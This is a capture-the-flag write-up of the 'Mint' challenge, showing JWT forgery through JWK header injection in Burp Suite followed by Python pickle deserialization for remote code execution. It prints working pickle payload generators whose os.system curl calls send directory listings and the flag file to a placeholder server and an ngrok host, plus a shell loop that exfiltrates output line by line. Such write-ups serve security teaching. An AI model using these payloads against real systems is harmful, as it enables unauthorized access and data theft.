Mint - Writeup.

JWT authentication bypass via jwk header injection, then Insecure deserialization leading to RCE.

First visiting the page we see this
<img width="1325" height="348" alt="home_page" src="https://github.com/user-attachments/assets/8d542939-167a-47ac-a23d-c00ecdb0ac1b" />

Creating an account with username and password 'flager' and '1234'.
The profile page shows the following information
<img width="1328" height="614" alt="profile_page" src="https://github.com/user-attachments/assets/8b183bd5-ab59-4f6a-9c14-0c04aba0917e" />
from here we have an obvious goal, get the role 'admin'.

the /.well-known/jwks.json page displays the following
<img width="919" height="204" alt="image" src="https://github.com/user-attachments/assets/fd95a34d-ff43-41c7-8ec8-ac7d735d4197" />

Let's open up the Burpsuite and interpect the traffic.
<img width="1236" height="620" alt="image" src="https://github.com/user-attachments/assets/cae2a4f9-1822-48e2-992e-1e899aeeec71" />
We can see this huge mint_jwt token.

First thing I did was to generate a RSA key then simply change the role to 'admin', then embed it with my generated public key, and see if server accepts my provided token. And it did, here is the explanation:

In these type of vulnerabilities the server accepts the public key provided by jwk header. So what we need to do is to create a random RS256 key - which will have both Private and Public keys. Then take our token, modify it as needed - in our case change 'role' to 'admin' and simply change the 'public' claim to our own public key, then forge it using our generated private key. Afterwards, the server takes the request, uses user provided public key and validates the token using the given public key (since that is the vulnerability) and of course it is valid because it was signed with our private key.

it is done really easily in Burpsuite:
First, Install the extension 'JWT Editor' if not installed.

move to the 'JWT Editor' tab above
Press 'New RSA', then OK. having our RSA key, it is time to modify the token.
<img width="1233" height="621" alt="image" src="https://github.com/user-attachments/assets/f055a4e3-492b-4426-ab57-411701bf56c3" />

Go to Repeater, below the request there are several tabs, moving to 'JSON WEB TOKENS' takes us to our token where we can modify it.
<img width="1330" height="768" alt="image" src="https://github.com/user-attachments/assets/c8a0fff7-fe94-48f8-95a7-8b2cde8c3514" />

Change the role to 'admin', and on left bottom click 'Attack' and select 'Embedded with JWK', then, simply click 'send' button and observe the response.
<img width="306" height="596" alt="image" src="https://github.com/user-attachments/assets/a631c161-08e1-43a3-b6b6-b2189f98a8f2" />

Here we can see /admin page meaning we got admin access
<img width="450" height="493" alt="image" src="https://github.com/user-attachments/assets/5cce2b26-c27f-4a83-8ed7-27dc96bc1eba" />

To continue working with browser, simply paste the token from the same 'JSON WEB TOKENS' tab to your browser's storage. 
<img width="989" height="138" alt="image" src="https://github.com/user-attachments/assets/4ccf085f-cd4d-4386-9460-7fb70b771a44" />

In admin panel we see huge hints, and it is obvious that it is going to be Insecure deserialization leading to RCE.
<img width="1315" height="522" alt="image" src="https://github.com/user-attachments/assets/03c6c2c7-b3c8-4885-883b-93bf9288b422" />

But there is a problem. We can't see the actual output from the RCE. To solve this, there are several tools that might help like ngrok or webhook.
In this showcase I will be using ngrok.

Following script will give the flag:

import pickle, base64, os 

class RCE: 
        def __reduce__(self): 
                return (os.system, ("curl http://YOUR-SERVER/flag=$(cat ../flag.txt | base64)",))

payload = base64.b64encode(pickle.dumps(RCE())).decode() 
print(payload)

Here is how it works:

the pickle itself parses data - the key part is that it also allows to call functions.

__reduce__ tells pickle: 'When reconstructing this object, call this function with these arguments'.
like (call, args). in our case it is (os.system, ("curl http://YOUR-SERVER/flag=$(cat ../flag.txt | base64)",)
then, at the end, we just base64 encode it.

But first we need to find the flag.txt file itself.
First thing I did was to simply 'ls' but it only captured the first line of the output(in my case it was 'app.py' file).
<img width="711" height="363" alt="image" src="https://github.com/user-attachments/assets/597600bd-4332-4bc0-9b09-8c590f895353" />

Then I tried 'ls ../' which gave me 'app' folder. So, I somehow needed to get all the lines of output.
<img width="753" height="366" alt="image" src="https://github.com/user-attachments/assets/f9814998-05ea-4393-a67e-c70fa6a1cd4a" />

Then I came op with this:
ls | while read do; i curl https://YOUR-SERVER/?x=$i;done

for every line it reads, it sends the result to my server.
But for the sake of simplicity, I will be using a bit different and a lot easier approach. Which is just base64 encoding output. 
$( {command} | base64) would give the full result without making anything complex.

so the payload I we will be using is this:

import pickle, base64, os 
class RCE: 
	def __reduce__(self): 
		return (os.system, ("curl https://coriaceous-fungistatic-lillian.ngrok-free.dev/x=$(ls ../ | base64 )",))

payload = base64.b64encode(pickle.dumps(RCE())).decode() 
print(payload)

Running the payload gives: gASVawAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFBjdXJsIGh0dHBzOi8vY29yaWFjZW91cy1mdW5naXN0YXRpYy1saWxsaWFuLm5ncm9rLWZyZWUuZGV2L3g9JChscyAuLi8gfCBiYXNlNjQgKZSFlFKULg==

let's see the result
<img width="947" height="394" alt="image" src="https://github.com/user-attachments/assets/74576e55-cab8-4fb4-b456-fe0f1c53258c" />

decoding the output
<img width="755" height="199" alt="image" src="https://github.com/user-attachments/assets/d7f66ffe-3ee7-43ac-8631-ad0f70269c15" />

Now we can use cat ../flag.txt | base64

We send the request and see the response
<img width="947" height="438" alt="image" src="https://github.com/user-attachments/assets/fd0062ca-3e09-4236-8927-3ededf6fe1e9" />

just decode it
<img width="544" height="46" alt="image" src="https://github.com/user-attachments/assets/0600bc93-d5eb-467a-8a4e-fbcbd2147df6" />

CUTS{jwk_h34d3r_1nj3ct10n_plu5_p1ckl3_rc3}
